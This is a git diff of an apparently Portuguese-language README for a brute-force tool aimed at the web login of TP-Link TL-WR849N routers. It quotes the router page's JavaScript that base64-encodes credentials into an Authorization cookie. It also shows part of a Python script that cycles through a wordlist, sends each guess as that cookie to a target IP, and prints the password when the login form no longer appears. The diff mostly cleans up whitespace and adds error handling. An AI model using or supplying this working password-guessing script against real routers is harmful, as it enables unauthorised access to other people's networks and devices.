@@ -24,7 +24,7 @@ TL-WR849N</h2>
  - Capturando url atual e subscrevendo o valor para o link definido no replace e redirecionando o usúario.
  - Criando uma variavél isLocker e atribuindo o valor false a mesma.
  - Deletando o cookie Authorization, vulgo responsável pela a autenticação.
- 
+
 ```javascript
 var url = window.location.href;
 
@@ -43,14 +43,14 @@ deleteCookie("Authorization");
 
 ```javascript
 
-function Base64Encoding(input) 
+function Base64Encoding(input)
 {
 	var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
 	var output = "";
 	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
 	var i = 0;
 	input = utf8_encode(input);
-	while (i < input.length) 
+	while (i < input.length)
 	{
 		chr1 = input.charCodeAt(i++);
 		chr2 = input.charCodeAt(i++);
@@ -59,12 +59,12 @@ function Base64Encoding(input)
 		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
 		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
 		enc4 = chr3 & 63;
-		
-		if (isNaN(chr2)) 
+
+		if (isNaN(chr2))
 		{
 			enc3 = enc4 = 64;
-		} 
-		else if (isNaN(chr3)) 
+		}
+		else if (isNaN(chr3))
 		{
 			enc4 = 64;
 		}
@@ -87,7 +87,7 @@ function PCWin(event)
 }
 
 function PCSubWin()
-{	
+{
     // Verifica se o usúario não está bloqueado por alguns segundos
     if (isLocked == true)
      {
@@ -98,7 +98,7 @@ function PCSubWin()
     var auth;
     var password = $("pcPassword").value;
     var userName = $("userName").value;
-    
+
     // Concatena a palavra "Basic" com a hash base64 de userName com ":" e o password
     auth = "Basic "+Base64Encoding(userName+":"+password);
     // Atribui o valor ao Cookie do navegador com a chave Authorization e com o auth como conteúdo
@@ -119,22 +119,27 @@ def main():
     for i in wordlist:
 
         login = str(sys.argv[1])
-        senha = i.rstrip()
+        password = i.rstrip()
         auth  = "Basic "
 
-        authEncode = auth+base64.b64encode(login+':'+senha)
+        authEncode = auth+base64.b64encode(login+':'+password)
 
         cookie = {"Authorization": authEncode}
 
-        response = r.get('http://'+sys.argv[2], cookies=cookie)
+        try:
+            response = r.get('http://'+sys.argv[2], cookies=cookie)
+        except:
+            splash()
+            print("\tError to connect: " + sys.argv[2])
+            exit(1)
 
         if response.content.count('id="userName"') != 1:
             os.system('setterm -cursor on')
-            print('\n\tPassword Found =====> ' + senha)
+            print('\n\tPassword Found =====> ' + password)
             exit(0)
-        else:
-            os.system("clear")
-            splash()
-            count = count + 1
-            print('\t[ '+ str(count) + ' ] Password not found ===> ' + senha)	    
+
+        os.system("clear")
+        splash()
+        count = count + 1
+        print('\t[ '+ str(count) + ' ] Password not found ===> ' + password)   
 ```
